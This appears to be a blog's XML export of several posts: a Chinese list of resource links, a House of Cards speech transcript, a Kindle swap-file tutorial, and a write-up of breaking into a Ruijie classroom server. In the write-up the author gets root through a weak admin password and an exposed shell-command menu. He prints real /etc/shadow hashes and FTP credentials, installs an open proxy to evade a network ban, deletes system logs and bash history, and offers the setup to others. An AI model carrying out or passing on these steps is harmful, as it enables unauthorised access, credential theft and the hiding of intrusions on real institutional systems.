href="http://sc.chinaz.com/yinxiao/" target="_blank" rel="noopener">http://sc.chinaz.com/yinxiao/</a></p><p>Soundsnap<a href="http://www.soundsnap.com/" target="_blank" rel="noopener">http://www.soundsnap.com/</a></p><p>Freeplay Music<a href="http://www.freeplaymusic.com/" target="_blank" rel="noopener">http://www.freeplaymusic.com/</a></p><p>Ilovewavs<a href="http://www.ilovewavs.com/" target="_blank" rel="noopener">http://www.ilovewavs.com/</a></p><p>Breakout<a href="http://www.breakout4u.com/en/" target="_blank" rel="noopener">http://www.breakout4u.com/en/</a></p><p>十四、影视后期教程类网站</p><p>我要自学网 <a href="http://t.cn/hgWA5w" target="_blank" rel="noopener">http://t.cn/hgWA5w</a></p><p>翼虎网 <a href="http://t.cn/RhcgNMN" target="_blank" rel="noopener">http://t.cn/RhcgNMN</a></p><p>飞特网 <a href="http://t.cn/hbBHpZ" target="_blank" rel="noopener">http://t.cn/hbBHpZ</a></p><p>Videocopilot<a href="http://www.videocopilot.net/" target="_blank" rel="noopener">http://www.videocopilot.net/</a></p><p>Vfxinfo<a href="http://vfxinfo.net/" target="_blank" rel="noopener">http://vfxinfo.net/</a></p><p>BW Design<a href="http://benwattsdesign.com/" target="_blank" rel="noopener">http://benwattsdesign.com/</a></p><p>十五、免费视频素材 /模板下载网站</p><p>视崛 <a href="http://www.shij001.com/" target="_blank" rel="noopener">http://www.shij001.com/</a></p><p>92 素材网 <a href="http://www.92sucai.com/" target="_blank" rel="noopener">http://www.92sucai.com/</a></p><p>新 GG 儿 <a href="http://www.newcger.com/" target="_blank" rel="noopener">http://www.newcger.com/</a></p><p>千图网 <a href="http://www.58pic.com/shipin/" target="_blank" rel="noopener">http://www.58pic.com/shipin/</a></p><p>39 视频 <a href="http://www.39video.com/" target="_blank" rel="noopener">http://www.39video.com/</a></p><p>模板天空 <a href="http://www.mobantiankong.com/" target="_blank" rel="noopener">http://www.mobantiankong.com/</a></p><p>人人素材社区 <a href="http://www.rr-sc.com/?fromuid=201838" target="_blank" rel="noopener">http://www.rr-sc.com/?fromuid=201838</a></p><p>十六、 Photoshop 教程网站</p><p>我要自学网 <a href="http://www.51zxw.net/" target="_blank" rel="noopener">http://www.51zxw.net/</a></p><p>大师之路 <a href="http://99ut.blueidea.com/text/photoshop/basic/index.html" target="_blank" rel="noopener">http://99ut.blueidea.com/text/photoshop/basic/index.html</a></p><p>52photoshop<a href="http://www.52photoshop.cn/" target="_blank" rel="noopener">http://www.52photoshop.cn/</a></p><p>PSDFAN<a href="http://psd.fanextra.com/" target="_blank" rel="noopener">http://psd.fanextra.com/</a></p><p>Photoshop Tutorials<a href="http://www.photoshoptutorials.ws/" target="_blank" rel="noopener">http://www.photoshoptutorials.ws/</a></p><p>PS Brushes<a href="http://www.psbrushes.net/" target="_blank" rel="noopener">http://www.psbrushes.net/</a></p><p>ps 联盟 <a href="http://www.68ps.com/" target="_blank" rel="noopener">http://www.68ps.com/</a></p><p>十七、专业影评类网站</p><p>时光网 <a href="http://www.mtime.com/community/" target="_blank" rel="noopener">http://www.mtime.com/community/</a></p><p>豆瓣电影 <a href="http://movie.douban.com/" target="_blank" rel="noopener">http://movie.douban.com/</a></p><p>烂番茄 <a href="http://www.rottentomatoes.com/" target="_blank" rel="noopener">http://www.rottentomatoes.com/</a></p><p>IMBD<a href="http://www.imdb.com/" target="_blank" rel="noopener">http://www.imdb.com/</a></p><p>美国广播影评人协会 <a href="http://www.criticschoice.com/" target="_blank" rel="noopener">http://www.criticschoice.com/</a></p><p>纽约影评家协会 <a href="http://www.nyfcc.com/" target="_blank" rel="noopener">http://www.nyfcc.com/</a></p><p>Film<a href="http://www.film.com/" target="_blank" rel="noopener">http://www.film.com/</a></p><p>GoodFil.ms<a href="http://goodfil.ms/" target="_blank" rel="noopener">http://goodfil.ms/</a></p><p>Cinephilia<a href="http://cinephilia.net/" target="_blank" rel="noopener">http://cinephilia.net/</a></p><p>ScreenJunkies<a href="http://www.screenjunkies.com/" target="_blank" rel="noopener">http://www.screenjunkies.com/</a></p><p>IndieWire:<a href="http://www.indiewire.com/" target="_blank" rel="noopener">http://www.indiewire.com/</a></p><p>十八、公开课网站</p><p>网易公开课： <a href="http://open.163.com/" target="_blank" rel="noopener">http://open.163.com/</a></p><p>中国大学 MOOC ： <a href="http://www.icourse163.org/" target="_blank" rel="noopener">http://www.icourse163.org/</a></p><p>新浪公开课： <a href="http://open.sina.com.cn/" target="_blank" rel="noopener">http://open.sina.com.cn/</a></p><p>央视网–公开课： <a href="http://opencla.cntv.cn/" target="_blank" rel="noopener">http://opencla.cntv.cn/</a></p><p>爱课堂： <a href="http://www.icourses.cn/home/" target="_blank" rel="noopener">http://www.icourses.cn/home/</a></p><p>MOOC 中国： <a href="http://www.mooc.cn/" target="_blank" rel="noopener">http://www.mooc.cn/</a></p><p>超星公开课： <a href="http://openv.chaoxing.com/" target="_blank" rel="noopener">http://openv.chaoxing.com/</a></p><p>十九、小语种系列学习资源</p><p>小语种入门： <a href="http://www.yingyurumen.com/" target="_blank" rel="noopener">http://www.yingyurumen.com/</a></p><p>小语种学习网： <a href="http://xyz.tingroom.com/" target="_blank" rel="noopener">http://xyz.tingroom.com/</a></p><p>其他小语种学习资源： <a href="http://www.cmzyk.com/h-nd-633.html" target="_blank" rel="noopener">http://www.cmzyk.com/h-nd-633.html</a></p><p>二十、其他系列资源</p><p>学术网站大全： <a href="http://dir.cnki.net/" target="_blank" rel="noopener">http://dir.cnki.net/</a></p><p>常用二十六大学术搜素引擎： <a href="http://cmzyk.lofter.com/post/1cb13862_27ea8a6" target="_blank" rel="noopener">http://cmzyk.lofter.com/post/1cb13862_27ea8a6</a></p><p>歌谱简谱搜索下载网站： <a href="http://suo.im/gz9xj" target="_blank" rel="noopener">http://suo.im/gz9xj</a></p><p>10 个 LOGO 资源站： <a href="http://www.uisdc.com/top-logo-design-resources" target="_blank" rel="noopener">http://www.uisdc.com/top-logo-design-resources</a></p><p>10 个无版权限制的大图特供网站： <a href="http://www.uisdc.com/free-hd-picture-website" target="_blank" rel="noopener">http://www.uisdc.com/free-hd-picture-website</a></p><p>找工作必备网站大全： <a href="http://www.cmzyk.com/h-nd-j-79-4_5.html" target="_blank" rel="noopener">http://www.cmzyk.com/h-nd-j-79-4_5.html</a></p><p>查询国内外文献资料的实用网站： <a href="http://cmzyk.lofter.com/post/1cb13862_5cc54cb" target="_blank" rel="noopener">http://cmzyk.lofter.com/post/1cb13862_5cc54cb</a></p><p>法律网站大全： <a href="http://cmzyk.lofter.com/post/1cb13862_3189e56" target="_blank" rel="noopener">http://cmzyk.lofter.com/post/1cb13862_3189e56</a></p><p>财经类网站大全： <a href="http://www.cmzyk.com/h-nd-j-182-4_5.html" target="_blank" rel="noopener">http://www.cmzyk.com/h-nd-j-182-4_5.html</a></p><p>国外免费期刊全文数据库： <a href="http://cmzyk.lofter.com/post/1cb13862_27ea88a" target="_blank" rel="noopener">http://cmzyk.lofter.com/post/1cb13862_27ea88a</a></p><p>免费论文检测网站大全： <a href="http://cmzyk.lofter.com/post/1cb13862_26d5117" target="_blank" rel="noopener">http://cmzyk.lofter.com/post/1cb13862_26d5117</a></p><p>33 个最值得读的世界级社科博客榜单： <a href="http://www.cmzyk.com/h-nd-101-109_361.html" target="_blank" rel="noopener">http://www.cmzyk.com/h-nd-101-109_361.html</a></p>]]></content>
      
      
        <tags>
            
            <tag> Resources </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Moving Speech by Claire UnderWood in S04E10 HOC[EN]</title>
      <link href="/2016/Moving-Speech-by-Claire-UnderWood-in-S04E10-HOC/"/>
      <url>/2016/Moving-Speech-by-Claire-UnderWood-in-S04E10-HOC/</url>
      <content type="html"><![CDATA[<p>Ladies and gentlemen, it is a great honor to introduce Secretary of State Catherine Durant. Thank you, thank you very much.<br>I know that all of you join me. I know that all of you join me in offering our sincere condolences to the First Lady for her loss.<br>Tonight, I want to offer my sincere gratitude to all the delegates who have honored me with their support during the course of this convention.<br>Thank you so much. However, after much deliberation…I have decided that I have more to offer you as Secretary of State than to resign and run for office. But I want to encourage every one of you who has supported me to join me in supporting this extraordinary woman, the First Lady of the United States, Claire Hale Underwood. Thank you.</p><hr><p>Good evening. As all of you know, my mother, Elizabeth Constance Hale, passed away last night after a long illness.<br>She was a strong woman…a fierce Texan…We had… a difficult relationship from childhood onwards.<br>At times, there were long periods of estrangement. We hurt each other… often and deeply. If there was one good thing that came from my mother’s illness…it gave us a chance to reconnect, to mend old wounds. And that’s not an opportunity people always get before a parent dies, and I’m grateful to have had that.<br>And what am I doing here? I’m here because my mother wanted me to be. Yesterday, before she passed, she said to me, “Claire… do this. If the people want it, listen to them. And if you lose, then you lose. But if you win…be honored, be humbled, and win this election with Francis!” And I told her, I said, “The Conway’s are tough opponents.”<br>And she said, “They may be tough, but they’re not Texas tough.”<br>Loss is a sobering phenomenon. Several months ago, I almost lost my husband. Our nation almost lost a President. Loss makes us re-evaluate what we hold dear. And I’ll tell you, there were…times in the not too distant past, where Francis and I, we… almost lost our marriage. Hard times when we thought we wouldn’t make it. And like many of you know, marriage isn’t always the smoothest road.<br>And it took the actions of a deranged young man to remind me how important Francis is to me.<br>And now, with my mother gone…He’s the only family I have left.<br>I trust Francis Underwood with my life, with our nation, with our future. I hope you will, too. And if you trust the both of us, I’ll heed my mother’s words, and I’ll be honored if you nominate me as his running mate. Thank You!</p><hr><p>女士们先生们：我很荣幸为大家介绍，国务卿凯瑟琳•杜兰特！谢谢！非常感谢大家，我知道大家和我一样，都对第一夫人亲人的离世表示诚挚慰唁。<br>今晚，我想向在代表大会上支持我的各位代表，致以我最真挚的感谢！我非常感谢你们，然而，经过深思熟虑，我决定，与辞职参加选举相比，作为国务卿，我能更好地为大家服务，但我希望支持我的各位，和我一起支持这位非凡的女性，美国第一夫人，克莱尔•黑尔•安德伍德，谢谢！<br>晚上好！正如大家所知，我母亲，伊丽莎白•康斯坦斯•黑尔，久病后于昨晚去世。她是个坚强的女人…，一个生猛的德州人；从小…我和她关系就不好，我们曾有过很长时间的疏离，我们经常深深地伤害对方。如果说母亲的病带来了什么好事，那就是：让我们有机会重新开始往来，抚平旧伤。人们并不是都能在父母离世前有这样的机会，我很感激有这样的机会，那我在这里做什么呢？我站在这里，是因为这是我母亲所希望的，昨天在她去世之前，她对我说，”克莱尔…去做吧，如果这是人们希望的，听他们的，如果失败了，那就是失败了；但是如果你赢了…要感到荣幸，保持谦逊，和弗兰西斯一起赢得选举！”，我告诉她：“康威夫妇是非常厉害的对手。”她说：“也许是吧。但也不比德州人。”失去让我们深思！几个月前，我差点失去了我丈夫，我们的国家差点失去了总统。失去让我们重新审视我们珍惜的一切！我还要告诉你们…就在不久之前，弗兰西斯和我…差点失去我们的婚姻。我们遇到了困难，还以为坚持不下去了。正如很多人所知，婚姻并非总是一帆风顺，是一个精神错乱的年轻人让我记起弗兰西斯对我有多重要。现在，我母亲去世了…他就是我唯一的亲人了。我愿把我的人生、我们的国家和未来、托付给弗兰西斯•安德伍德，我希望你们也能信任他，如果你们信任我们，我会谨遵母亲的话，如被提名为他的竞选搭档，我将深感荣幸！</p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>弱口令入侵锐捷云课堂 R3000SV2[EN]</title>
      <link href="/2016/Exploit-on-RuijieCloudClass-Manager-Server-R3000SV2/"/>
      <url>/2016/Exploit-on-RuijieCloudClass-Manager-Server-R3000SV2/</url>
      <content type="html"><![CDATA[<p>Contents:</p><ol><li>Prepare about Rain200S Client and Server</li><li>Lucky!Scanned Easily!</li><li>Discover SSH &amp; Samba &amp; FTP</li><li>Exploit &amp; Install Squid to cross the ban</li></ol><hr><h1 id="Prepare"><a href="#Prepare" class="headerlink" title="Prepare"></a>Prepare</h1><p>Software Needed : putty , nmap<br>Hardware Needed : joyful heart , your eyes . your hands<br>Rain200S Client Android Debug Entrance : Alt+Shift+F7</p><p>Rain200S is running Android 4.4.2 Built in AOSP , All Apks and install scripts is hosted on my vps.</p><hr><h1 id="Lucky-Scanned-Easily"><a href="#Lucky-Scanned-Easily" class="headerlink" title="Lucky!Scanned Easily!"></a>Lucky!Scanned Easily!</h1><p>See your RCC Client Config:</p><hr><h2 id="Your-will-discover"><a href="#Your-will-discover" class="headerlink" title="Your will discover :"></a>Your will discover :</h2><ul><li>Server IP Address : $HIDDEN-SERVER_IP</li><li>Normally Admin Password for Client Software : ruijie.com</li><li>Main Port Opened on the Server : 80(httpd , using Apache Tomcat), 22(SSH) ,21(Running vsftpd)</li><li>Main Protocol Running : KVM on QEMU , PXE Network Boot</li><li><p>7-zip V9.20 installed on C:\Program Files\RCC-ClassManager\7-Zip\</p><p>Luckily, I scanned weak password of login page on 80 port , Password Get!</p><ul><li>User : Admin</li><li>Password : admin</li></ul></li></ul><hr><h1 id="Discover-SSH-amp-Samba-amp-FTP"><a href="#Discover-SSH-amp-Samba-amp-FTP" class="headerlink" title="Discover SSH &amp; Samba &amp; FTP"></a>Discover SSH &amp; Samba &amp; FTP</h1><p> Using Putty to connect server via SSH</p><p> Admin &amp; admin connected successfully!</p><h2 id="Oh-Fuck-A-Quiet-Terminal-Response"><a href="#Oh-Fuck-A-Quiet-Terminal-Response" class="headerlink" title="Oh! Fuck , A Quiet Terminal Response!"></a>Oh! Fuck , A Quiet Terminal Response!</h2><hr><p>No , Not a Problem!<br>Input as it noticed “41.exec_shell_command”</p><hr><p>|————————-COMMAND—————————————</p><p><1>:cvm_version        <2>:cvm_monitor     <3>:ifconfig_list    <4>:list_all</4></3></2></1></p><p><5>:get_sn             <6>:get_status      <7>:list_base        <8>:list_iso</8></7></6></5></p><p><9>:list_temp          <10>:list_vms <11>:web_service_status<12>:list_instance</12></11></10></9></p><p><13>:list_instance_name     <14>:run_instance_fast     <15>:release_instance</15></14></13></p><p><16>:edit_image        <17>:edit_temp      <18>:ifconfig        <19>:dnsconfig</19></18></17></16></p><p><20>:open_port         <21>:close_port     <22>:change_ftpuser_pwd</22></21></20></p><p><23>:reset_ftpuser_pwd <24>:clone_image    <25>:create_base     <26>:del_base</26></25></24></23></p><p><27>:del_iso           <28>:get_check    <29>:list_resource<30>:preload_image</30></29></28></27></p><p><31>:rebase_image      <32>:rename_image <33>:list-preload    <34>:del_preload</34></33></32></31></p><p><35>:del_image         <36>:del_temp     <37>:list_image      <38>:replace_iso</38></37></36></35></p><p><39>:web_service       <40>:shutdown_instance         <41>:exec_shell_cmd</41></40></39></p><p><42>:expand_image      <43>:copy_temp                 <44>:list_backup_temp</44></43></42></p><p><45>:list_backup_temp_dir   <46>:del_backup_temp   <47>:del_backup_temp_dir</47></46></45></p><p><48>:poweroff          <49>:reboot        <50>:add_vlan        <51>:del_vlan</51></50></49></48></p><p><52>:list_vlan         <53>:quit          <0>:factory test<br>|——————————————————————————-</0></53></52></p><pre><code>41please input agrslsls ~&lt;args&gt;&lt;cmd&gt;ls ~&lt;/cmd&gt;&lt;/args&gt;exec_shell_cmd result:&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;return&gt;  &lt;command&gt;exec_shell_cmd&lt;/command&gt;  &lt;output&gt;anaconda-ks.cfginstall.loginstall.log.syslogiptables.saveks-post1.logks-post.log&lt;/output&gt;&lt;/return&gt;</code></pre><p>please choose the command (input a number between 0-53):</p><hr><pre><code>&gt; whoami# root&gt; cat /etc/shadow# root:$1$ib1ReZOT$/kwEfqJdhMIU/GF7HUJjs/:16665:0:99999:7::: # bin:*:15980:0:99999:7::: # daemon:*:15980:0:99999:7::: # adm:*:15980:0:99999:7::: # lp:*:15980:0:99999:7::: # sync:*:15980:0:99999:7::: # shutdown:*:15980:0:99999:7::: # halt:*:15980:0:99999:7::: # mail:*:15980:0:99999:7::: # uucp:*:15980:0:99999:7::: # operator:*:15980:0:99999:7::: # games:*:15980:0:99999:7::: # gopher:*:15980:0:99999:7::: # ftp:*:15980:0:99999:7::: # nobody:*:15980:0:99999:7::: # vcsa:!!:16665:::::: # saslauth:!!:16665:::::: # postfix:!!:16665:::::: # sshd:!!:16665:::::: # dbus:!!:16665:::::: # haldaemon:!!:16665:::::: # qemu:!!:16665:::::: # rpcuser:!!:16665:::::: # nfsnobody:!!:16665:::::: # radvd:!!:16665:::::: # rpc:!!:16665:0:99999:7::: # user:$6$dAbB4GRO$Me2XdFm0iXtn7T2bnM13EiRj0Ml.SrAq.Xmq5Wfmo8v8bxlfHBaz2b8jqzVgQLs57GjgQSHoHSLmPxsj5SUX//:16665:0:99999:7:::# pxeuser:$6$FOcL7ovA$B5.Mb0twCHpOkYLlLeo5YlO3JDNG9HjA22GvSvCJA4X7lxplVMAmUHpX7uSZno.fHy/8hjZm8wPciiZUS8ofo0:16665:0:99999:7:::# admin:$6$1rr7BCWK$z7ImwxlxPGPUFeLqOGOt4xrQvQjum7Lse0oOUav0HsBJ33uAe0A66OLWKqKd9h6N2y/K5sxJZ/geTeY8cFNfm1:16665:0:99999:7:::# lessons:$6$b6M8xaml$yVuLM8L1QhJH1cTMIRta3ySx645tx.fpOkRkTXGrjREB5pX7BljnPt6BdAhaxs/mCetloCXjLh2iUbAVbQvfg0:16665:0:99999:7:::# share:$6$Rexp1nDA$qbddPOOnWLhlhSRB9mh0zVOumKG/ZyAOYep.p7I3qefyeSKRAQbbvN7XA3nOE2gQd/F4jCc6cu2yEqJSAPK1Z0:16665:0:99999:7:::# upgrade:$6$3f0Mb485$2uLmNL0M7eEc6aRYQznhsedcr/JcwDY90gTtGmyKR.RAI.8n1hNPHluJ78X4xuv2myJP9LGtXcaPhvU9gvLNP.:16665:0:99999:7:::# postgres:!!:16665:::::: # tomcat:!!:16665:::::: # teacher:$6$2KKOchqB$lj4FlSqDWLQL.K0UqrxFHLxt6JrMen3Ig2hfQjZqG5F3KctWpd9u8XXEBdjyPhn88Fj0bNdLA.L0w8fq6fKOW/:16665:0:99999:7:::# dhcpd:!!:16665:::::: # ntp:!!:16665:::::: # mysql:!!:16665:::::: # apache:!!:16665:::::: </code></pre><hr><h2 id="Password-Hashed-Got"><a href="#Password-Hashed-Got" class="headerlink" title=" Password Hashed Got ! "></a><strong> Password Hashed Got ! </strong></h2><hr><pre><code>&gt; cat /etc/passwd# root:x:0:0:root:/root:/bin/bash # bin:x:1:1:bin:/bin:/sbin/nologin # daemon:x:2:2:daemon:/sbin:/sbin/nologin # adm:x:3:4:adm:/var/adm:/sbin/nologin # lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin # sync:x:5:0:sync:/sbin:/bin/sync # shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown # halt:x:7:0:halt:/sbin:/sbin/halt # mail:x:8:12:mail:/var/spool/mail:/sbin/nologin # uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin # operator:x:11:0:operator:/root:/sbin/nologin # games:x:12:100:games:/usr/games:/sbin/nologin # gopher:x:13:30:gopher:/var/gopher:/sbin/nologin # ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin # nobody:x:99:99:Nobody:/:/sbin/nologin # vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin # saslauth:x:499:76:&amp;quot;Saslauthd user&amp;quot;:/var/empty/saslauth:/sbin/nologin # postfix:x:89:89::/var/spool/postfix:/sbin/nologin # sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin # dbus:x:81:81:System message bus:/:/sbin/nologin # haldaemon:x:68:68:HAL daemon:/:/sbin/nologin # qemu:x:107:107:qemu user:/:/sbin/nologin # rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin # nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin # radvd:x:75:75:radvd user:/:/sbin/nologin # rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin # user:x:500:500::/home/user:/bin/bash # pxeuser:x:501:501::/home/pxeuser:/bin/bash # admin:x:502:0::/home/admin:/home/admin/login.sh # lessons:x:503:503::/opt/ftpshare/lessons:/sbin/nologin # share:x:504:504::/opt/ftpshare/share:/sbin/nologin # upgrade:x:505:505::/opt/ftpshare/upgrade:/sbin/nologin # postgres:x:26:26:PostgreSQL Server:/var/lib/pgsql:/bin/bash # tomcat:x:91:91:Apache Tomcat:/usr/share/tomcat6:/sbin/nologin # teacher:x:506:506::/home/teacher:/bin/bash # dhcpd:x:177:177:DHCP server:/:/sbin/nologin # ntp:x:38:38::/etc/ntp:/sbin/nologin # mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash # apache:x:48:48:Apache:/var/www:/sbin/nologin </code></pre><hr><h2 id="Login-Shell-got"><a href="#Login-Shell-got" class="headerlink" title=" Login Shell got ! "></a><strong> Login Shell got ! </strong></h2><hr><p> Using ‘\$HIDDEN-SERVER_IP’ to Discover Samba On WindowsXP</p><hr><pre><code>\\$HIDDEN-SERVER_IP</code></pre><hr><p>pxeuser?admin?share?<br>Wow!<br>The “/pxeuser” share includes all the clients login logs.<br>The “/admin” share includes all the tools that Ruijie Official made.<br>The “/share” share is the origin of the Disk D of the Clients.</p><hr><p>Upload Chrome and Putty to /share.<br>Done!</p><p> Using ‘<a href="ftp://user:password@IP:port/&#39;" target="_blank" rel="noopener">ftp://user:password@IP:port/&#39;</a> to find what is in FTP</p><hr><p><a href="ftp://share:share@$HIDDEN-SERVER_IP:21/" target="_blank" rel="noopener">ftp://share:share@$HIDDEN-SERVER_IP:21/</a><br><a href="ftp://lessons:lessons@$HIDDEN-SERVER_IP:21/" target="_blank" rel="noopener">ftp://lessons:lessons@$HIDDEN-SERVER_IP:21/</a></p><hr><p>The content of the “share” folder is the same as the overhead listed.<br>The content of the “lessons” folder is the KVM System Image of Client to boot with PXE Network Protocol.</p><p>Also , When I try to input a wrong password , it noticed me ‘220 Vsftpd v2.2” .<br>HAHAHAHA !</p><h1 id="Exploit-amp-Install-Squid-to-cross-the-ban"><a href="#Exploit-amp-Install-Squid-to-cross-the-ban" class="headerlink" title="Exploit &amp; Install Squid to cross the ban"></a>Exploit &amp; Install Squid to cross the ban</h1><p>Find the System Info and Change Password to get the root Permission</p><pre><code>[root@RCD ~]# lsb_releaseLSB Version:    :base-4.0-amd64:base-4.0-noarch:core-4.0-amd64:core-4.0-noarch[root@RCD ~]# uname -aLinux RCD 3.10.67.4-rj_R1 #1 SMP Thu May 28 14:41:55 CST 2015 x86_64 x86_64 x86_64 GNU/Linux[root@RCD ~]# iptables-restore &lt; ./iptables.save[root@RCD ~]# iptables -L</code></pre><p>Chain INPUT (policy ACCEPT)<br>target     prot opt source               destination<br>ACCEPT     udp  –  anywhere             anywhere            udp dpt:domain<br>ACCEPT     tcp  –  anywhere             anywhere            tcp dpt:domain<br>ACCEPT     udp  –  anywhere             anywhere            udp dpt:bootps<br>ACCEPT     tcp  –  anywhere             anywhere            tcp dpt:bootps<br>ACCEPT     tcp  –  anywhere             anywhere            tcp dpt:squid<br>ACCEPT     udp  –  anywhere             anywhere            udp dpt:ndl-aas</p><p>Chain FORWARD (policy ACCEPT)<br>target     prot opt source               destination<br>ACCEPT     all  –  anywhere             anywhere            ctstate RELATED,ESTABLISHED<br>ACCEPT     all  –  anywhere             anywhere<br>ACCEPT     all  –  anywhere             anywhere</p><p>Chain OUTPUT (policy ACCEPT)<br>target     prot opt source               destination<br>    [root@RCD ~]#</p><pre><code>yum update -y &amp;&amp; yum install squid -ychkconfig squid on</code></pre><h2 id="Change-squid-conf-to-allow-80-port-connection"><a href="#Change-squid-conf-to-allow-80-port-connection" class="headerlink" title="Change squid.conf to allow 80 port connection"></a>Change squid.conf to allow 80 port connection</h2><pre><code>[root@RCD ~]# cat /etc/squid/squid.conf## Recommended minimum configuration:#acl manager proto cache_objectacl localhost src 127.0.0.1/32 ::1acl to_localhost dst 127.0.0.0/8 0.0.0.0/32 ::1# Example rule allowing access from your local networks.# Adapt to list your (internal) IP networks from where browsing# should be allowedacl localnet src 10.0.0.0/8     # RFC1918 possible internal networkacl localnet src 172.16.0.0/12  # RFC1918 possible internal networkacl localnet src 192.168.0.0/16 # RFC1918 possible internal networkacl localnet src fc00::/7       # RFC 4193 local private network rangeacl localnet src fe80::/10      # RFC 4291 link-local (directly plugged) machinesacl SSL_ports port 443acl Safe_ports port 80          # httpacl Safe_ports port 21          # ftpacl Safe_ports port 443         # httpsacl Safe_ports port 70          # gopheracl Safe_ports port 210         # waisacl Safe_ports port 1025-65535  # unregistered portsacl Safe_ports port 280         # http-mgmtacl Safe_ports port 488         # gss-httpacl Safe_ports port 591         # filemakeracl Safe_ports port 777         # multiling httpacl CONNECT method CONNECT## Recommended minimum Access Permission configuration:## Only allow cachemgr access from localhosthttp_access allow manager localhosthttp_access allow manager# Deny requests to certain unsafe portshttp_access allow !Safe_ports# Deny CONNECT to other than secure SSL portshttp_access allow CONNECT !SSL_ports# We strongly recommend the following be uncommented to protect innocent# web applications running on the proxy server who think the only# one who can access services on &quot;localhost&quot; is a local user#http_access deny to_localhost## INSERT YOUR OWN RULE(S) HERE TO ALLOW ACCESS FROM YOUR CLIENTS## Example rule allowing access from your local networks.# Adapt localnet in the ACL section to list your (internal) IP networks# from where browsing should be allowedhttp_access allow localnethttp_access allow localhost# And finally deny all other access to this proxyhttp_access allow all# Squid normally listens to port $HIDDEN_PORThttp_port $HIDDEN_PORT# Uncomment and adjust the following to add a disk cache directory.#cache_dir ufs /var/spool/squid 100 16 256# Leave coredumps in the first cache dircoredump_dir /var/spool/squid# Add any of your own refresh_pattern entries above these.refresh_pattern ^ftp:           1440    20%     10080refresh_pattern ^gopher:        1440    0%      1440refresh_pattern -i (/cgi-bin/|\?) 0     0%      0refresh_pattern .               0       20%     4320</code></pre><blockquote><p>I change the port which squid is listened to , because it can only be connected in our local network.</p></blockquote><h1 id="Last-Step-Clear-Logs"><a href="#Last-Step-Clear-Logs" class="headerlink" title="Last Step!Clear Logs!"></a>Last Step!Clear Logs!</h1><pre><code>Login as rootrm -rf /var/log/*rm -rf ~/.bash_history</code></pre><h1 id="Done-And-Revealation"><a href="#Done-And-Revealation" class="headerlink" title="Done! And Revealation!"></a>Done! And Revealation!</h1><blockquote><p>Donnot set a weak password or running a unset iptables!</p></blockquote><hr><p>Thanks!<br>If anyone who wants to cross the ban , please contact me via email to get the config.Thanks!</p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>How to Use SWAP File to Boost Your Old Kindle[Tested on KPW2]</title>
      <link href="/2016/How-to-Use-SWAP-File-to-Boost-Your-Old-Kindle-Tested-on-KPW2/"/>
      <url>/2016/How-to-Use-SWAP-File-to-Boost-Your-Old-Kindle-Tested-on-KPW2/</url>
      <content type="html"><![CDATA[<p><strong>Of course , your Kindle needed to be jailbreaked and install KUAL &amp; KTerm first!</strong></p><hr><h1 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h1><p>Recently ,I have no hardware to play.You know that studying in YUSS XingYao Campus is so boring,so that as a poor student,I bought a Kindle PaperWhite 2 in Taobao to read &lt;&lt;\Zhihu Daily\&gt;&gt; every day.</p><p>I can connect with this fucking world in this way!</p><hr><h2 id="Bash-Code"><a href="#Bash-Code" class="headerlink" title="Bash Code"></a>Bash Code</h2><p>Here’s the bash code , which should be just executed one by one in kterm.</p><pre><code> free -t -m # 可用RAM  df -h # 可用磁盘空间 cd /mnt/base-us #一定是这个目录  dd if=/dev/null of=./swapfile bs=1M count=256 #按照 1~2 倍原则创建 swap 文件  mkswap ./swapfile #格式化为 swap 格式  swapon -a ./swapfile #挂载，每次启动时手动执行 free -t -m #查看是否挂载成功 </code></pre><hr><p>Connect with me at Google+ , Searching for “Yang Yuguang” is okay.</p>]]></content>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
